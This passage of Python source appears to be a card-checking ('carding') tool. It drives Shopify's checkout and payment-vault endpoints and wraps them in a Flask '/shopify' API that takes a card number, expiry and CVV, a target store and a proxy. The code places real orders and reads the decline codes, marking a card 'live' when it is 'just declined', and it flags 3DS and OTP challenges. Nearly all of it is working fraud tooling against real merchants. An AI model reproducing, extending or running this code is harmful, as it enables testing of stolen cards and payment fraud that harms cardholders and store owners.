                    if val.get("currencyCode"):
                        currency = val["currencyCode"]

                # Extract running total
                rt = seller.get("runningTotal", {}).get("value", {})
                running_total = rt.get("amount", actual_subtotal)
                if rt.get("currencyCode"):
                    currency = rt["currencyCode"]

                # Update merch term with actual price (important for delivery proposal)
                merch_term["merchandiseLines"][0]["expectedTotalPrice"] = {
                    "value": {"amount": actual_subtotal, "currencyCode": currency}
                }

                # Extract shipping
                delivery_data = seller.get("delivery", {})
                delivery_strategy = ""
                shipping_amount   = 0.0

                if delivery_data.get("__typename") == "FilledDeliveryTerms":
                    dl = delivery_data.get("deliveryLines", [{}])
                    if dl:
                        strats = dl[0].get("availableDeliveryStrategies", [])
                        if strats:
                            delivery_strategy = strats[0].get("handle", "")
                            try:
                                shipping_amount = float(
                                    strats[0].get("amount", {}).get("value", {}).get("amount", "0") or "0"
                                )
                            except (ValueError, TypeError):
                                shipping_amount = 0.0

                # Extract tax
                tax_amount = 0.0
                tax_data = seller.get("tax") or seller.get("taxes") or {}
                if tax_data.get("__typename") == "FilledTaxTerms":
                    try:
                        tax_amount = float(
                            tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0") or "0"
                        )
                    except (ValueError, TypeError):
                        tax_amount = 0.0

                # Extract payment method
                payment_data = seller.get("payment", {})
                payment_identifier = None
                gateway = "UNKNOWN"

                if payment_data.get("__typename") == "FilledPaymentTerms":
                    for line in payment_data.get("availablePaymentLines", []):
                        pm = line.get("paymentMethod", {})
                        pid = pm.get("paymentMethodIdentifier")
                        if pid:
                            payment_identifier = pid
                            gateway = (pm.get("extensibilityDisplayName") or
                                       pm.get("name") or "SHOPIFY")
                            break

                if not payment_identifier:
                    return False, "NO_PAYMENT_METHOD", gateway, total_price, currency

                total_price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"

            except (KeyError, TypeError, IndexError) as e:
                return False, f"PARSE_SHIP_ERROR:{e}", gateway, total_price, currency

            # ── 5. Delivery proposal ────────────────────────────────────────
            del_vars = {
                **base_vars,
                "merchandise": merch_term,
                "delivery": {
                    **delivery_term,
                    "deliveryLines": [{
                        **delivery_term["deliveryLines"][0],
                        "destination": {
                            "streetAddress": {
                                "address1": addr["address1"],
                                "address2": "",
                                "city": addr["city"],
                                "countryCode": cc_country,
                                "postalCode": addr["postalCode"],
                                "firstName": fn,
                                "lastName": ln,
                                "zoneCode": addr["zoneCode"],
                                "phone": addr["phone"],
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle": delivery_strategy,
                                "customDeliveryRate": False,
                            },
                            "options": {},
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": stableId}]},
                        "expectedTotalPrice": {
                            "value": {"amount": str(shipping_amount), "currencyCode": currency}
                        },
                        "destinationChanged": False,
                    }],
                },
                "payment": {
                    **base_vars["payment"],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": addr["address1"], "address2": "",
                            "city": addr["city"], "countryCode": cc_country,
                            "postalCode": addr["postalCode"], "firstName": fn,
                            "lastName": ln, "zoneCode": addr["zoneCode"],
                            "phone": addr["phone"],
                        }
                    },
                },
                "taxes": {
                    **base_vars["taxes"],
                    "proposedTotalAmount": {
                        "value": {"amount": str(tax_amount), "currencyCode": currency}
                    },
                },
            }
            if checkpoint_data:
                del_vars["checkpointData"] = checkpoint_data

            del_payload = {
                "query": QUERY_PROPOSAL_DELIVERY,
                "variables": del_vars,
                "operationName": "Proposal",
            }

            _, del_text = await post_gql(del_payload, "Proposal")

            # Update checkpoint from delivery response
            if del_text:
                try:
                    dj = json.loads(del_text)
                    dr = dj["data"]["session"]["negotiate"]["result"]
                    if dr.get("checkpointData"):
                        checkpoint_data = dr["checkpointData"]
                    # Refresh running total from delivery proposal
                    ds = dr.get("sellerProposal", {})
                    drt = (ds.get("runningTotal") or {}).get("value", {})
                    if drt.get("amount"):
                        running_total = drt["amount"]
                    # Refresh tax
                    dtax = ds.get("tax") or ds.get("taxes") or {}
                    if dtax.get("__typename") == "FilledTaxTerms":
                        try:
                            tax_amount = float(
                                dtax.get("totalTaxAmount", {}).get("value", {}).get("amount", tax_amount) or tax_amount
                            )
                        except (ValueError, TypeError):
                            pass
                    total_price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                except Exception:
                    pass

            # ── 6. Vault card ───────────────────────────────────────────────
            vault_payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "name": f"{fn} {ln}",
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                },
                "payment_session_scope": urlparse(ourl).netloc,
            }
            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "Referer": "https://checkout.pci.shopifyinc.com/",
                "User-Agent": ua,
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            token = None
            for vault_attempt in range(3):
                try:
                    vr = await session.post(
                        "https://checkout.pci.shopifyinc.com/sessions",
                        json=vault_payload,
                        headers=vault_headers,
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=10),  # relaxed from 5s
                    )
                    vd = await vr.json()
                    token = vd.get("id")
                    if token:
                        break
                    await asyncio.sleep(0.5)
                except asyncio.TimeoutError:
                    if vault_attempt < 2:
                        await asyncio.sleep(1)
                    continue
                except Exception:
                    if vault_attempt < 2:
                        await asyncio.sleep(0.5)
                    continue

            if not token:
                return False, "VAULT_FAILED", gateway, total_price, currency

            # ── 7. Submit ───────────────────────────────────────────────────
            submit_vars = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": del_vars["delivery"],
                    "merchandise": merch_term,
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": payment_identifier,
                                    "sessionId": token,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": addr["address1"], "address2": "",
                                            "city": addr["city"], "countryCode": cc_country,
                                            "postalCode": addr["postalCode"], "firstName": fn,
                                            "lastName": ln, "zoneCode": addr["zoneCode"],
                                            "phone": addr["phone"],
                                        }
                                    },
                                    "cardSource": None,
                                }
                            },
                            "amount": {"value": {"amount": running_total, "currencyCode": currency}},
                            "dueAt": None,
                        }],
                        "billingAddress": del_vars["payment"]["billingAddress"],
                    },
                    "buyerIdentity": base_vars["buyerIdentity"],
                    "taxes": del_vars["taxes"],
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": checkout_url},
            }
            if checkpoint_data:
                submit_vars["input"]["checkpointData"] = checkpoint_data

            submit_payload = {
                "query": MUTATION_SUBMIT,
                "variables": submit_vars,
                "operationName": "SubmitForCompletion",
            }

            _, sub_text = await post_gql(submit_payload, "SubmitForCompletion")

            if not sub_text:
                return False, "SUBMIT_TIMEOUT", gateway, total_price, currency
            if _is_captcha(sub_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            # Guard against site errors that indicate the site isn't usable
            if "Your order total has changed" in sub_text:
                return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency
            if "requested payment method is not available" in sub_text.lower():
                return False, "PAYMENT_METHOD_UNAVAILABLE", gateway, total_price, currency

            try:
                sj = json.loads(sub_text)
                sd = sj.get("data", {}).get("submitForCompletion", {})
            except json.JSONDecodeError:
                return False, f"INVALID_JSON_SUBMIT", gateway, total_price, currency

            if not sd:
                errs = sj.get("errors", [])
                if errs:
                    return False, errs[0].get("message", "GQL_ERROR")[:60], gateway, total_price, currency
                return False, "EMPTY_SUBMIT", gateway, total_price, currency

            st = sd.get("__typename", "")

            if st in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = sd.get("receipt", {})
                if not receipt:
                    return False, "NO_RECEIPT", gateway, total_price, currency
                rt = receipt.get("__typename", "")
                if rt == "ProcessedReceipt":
                    return True, "ORDER_PLACED", gateway, total_price, currency
                rid = receipt.get("id")
                if not rid:
                    return False, "NO_RECEIPT_ID", gateway, total_price, currency

            elif st == "SubmitFailed":
                reason = sd.get("reason", "UNKNOWN")
                return False, _clean_response(reason), gateway, total_price, currency

            elif st == "SubmitRejected":
                errs = sd.get("errors", [])
                for err in errs:
                    code = err.get("code", "")
                    lmsg = err.get("localizedMessage", "")
                    nmsg = err.get("nonLocalizedMessage", "")
                    if code and code not in ("GENERIC_ERROR", "PAYMENT_FAILED", ""):
                        return False, code, gateway, total_price, currency
                    detail = lmsg or nmsg
                    if detail:
                        return False, detail[:80], gateway, total_price, currency
                return False, "SUBMIT_REJECTED", gateway, total_price, currency

            elif st == "Throttled":
                return False, "THROTTLED", gateway, total_price, currency

            elif st == "CheckpointDenied":
                return False, "CHECKPOINT_DENIED", gateway, total_price, currency

            # Receipt polling
            receipt = sd.get("receipt", {})
            rid = receipt.get("id") if receipt else None
            if not rid:
                return False, "NO_RECEIPT_ID", gateway, total_price, currency

            # ── 8. Poll receipt ─────────────────────────────────────────────
            await asyncio.sleep(0.8)

            poll_payload = {
                "query": QUERY_POLL,
                "variables": {"receiptId": rid, "sessionToken": sst},
                "operationName": "PollForReceipt",
            }

            final_text = ""
            for i in range(8):  # up to ~8s polling
                _, final_text = await post_gql(poll_payload, "PollForReceipt")
                if not final_text:
                    await asyncio.sleep(1)
                    continue
                if _is_captcha(final_text):
                    return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

                try:
                    pj = json.loads(final_text)
                    rdata = pj.get("data", {}).get("receipt", {})
                    if not rdata:
                        await asyncio.sleep(1)
                        continue

                    rtype = rdata.get("__typename", "")

                    if rtype == "ProcessedReceipt":
                        return True, "ORDER_PLACED", gateway, total_price, currency

                    elif rtype == "FailedReceipt":
                        perr = rdata.get("processingError", {})
                        etype = perr.get("__typename", "")
                        if etype == "PaymentFailed":
                            code = perr.get("code", "")
                            msg  = perr.get("messageUntranslated", "")
                            low  = (code + msg).lower()
                            if any(k in low for k in ["3d_secure", "3ds", "action_required",
                                                       "authentication", "redirect"]):
                                return False, "3DS_REQUIRED", gateway, total_price, currency
                            # Real decline — return True (card is live, just declined)
                            if code and code not in ("GENERIC_ERROR", "PAYMENT_FAILED"):
                                return True, code, gateway, total_price, currency
                            if msg:
                                return True, msg[:80], gateway, total_price, currency
                            return True, "PAYMENT_FAILED", gateway, total_price, currency
                        return True, etype or "FAILED_RECEIPT", gateway, total_price, currency

                    elif rtype == "ActionRequiredReceipt":
                        return True, "OTP_REQUIRED", gateway, total_price, currency

                    elif rtype in ("ProcessingReceipt", "WaitingReceipt"):
                        poll_delay = rdata.get("pollDelay", 1000) / 1000  # ms to s
                        await asyncio.sleep(min(poll_delay, 2.0))
                        continue

                except Exception:
                    await asyncio.sleep(1)
                    continue

            # Fallback text analysis
            fl = (final_text or "").lower()
            if "processedreceipt" in fl or "shopify_payments" in fl:
                return True, "ORDER_PLACED", gateway, total_price, currency
            if "actionrequiredreceipt" in fl:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            if "failedreceipt" in fl or "paymentfailed" in fl:
                code = _extract(final_text, '"code":"', '"')
                return True, code or "PAYMENT_FAILED", gateway, total_price, currency

            return False, "POLL_TIMEOUT", gateway, total_price, currency

    except Exception as e:
        return False, f"INTERNAL_ERROR:{str(e)[:100]}", gateway, total_price, currency


# ═══════════════════════════════════════════════════
# FLASK APP
# ═══════════════════════════════════════════════════

app = Flask(__name__)


def parse_cc_string(s: str) -> dict:
    parts = s.split("|")
    if len(parts) != 4:
        raise ValueError("Use CC|MM|YYYY|CVV")
    return {"cc": parts[0].strip(), "mes": parts[1].strip(),
            "ano": parts[2].strip(), "cvv": parts[3].strip()}


@app.route("/shopify", methods=["GET"])
def shopify_checker():
    try:
        site      = request.args.get("site", "").strip()
        cc_string = request.args.get("cc", "").strip()
        proxy_str = request.args.get("proxy", "").strip() or None
        variant   = request.args.get("variant", "").strip() or None

        if not site:
            return jsonify({"error": "Missing 'site'", "Status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc'", "Status": False}), 400

        try:
            p = parse_cc_string(cc_string)
        except ValueError as e:
            return jsonify({"error": str(e), "Status": False}), 400

        future = asyncio.run_coroutine_threadsafe(
            process_card(p["cc"], p["mes"], p["ano"], p["cvv"],
                         site, variant, proxy_str),
            _loop,
        )
        success, message, gateway, price, currency = future.result(timeout=38)

        clean = _clean_response(message)
        return jsonify({
            "Gateway":  gateway,
            "Price":    float(price) if str(price).replace(".", "", 1).isdigit() else 0.0,
            "Currency": currency,
            "Response": clean,
            "Status":   success,
            "cc":       cc_string,
        })

    except Exception as e:
        return jsonify({
            "error": str(e), "Status": False, "Gateway": "UNKNOWN",
            "Price": 0.0, "Response": f"ERROR:{str(e)[:60]}", "cc": "",
        }), 500


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "service": "autoshopify-api"})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)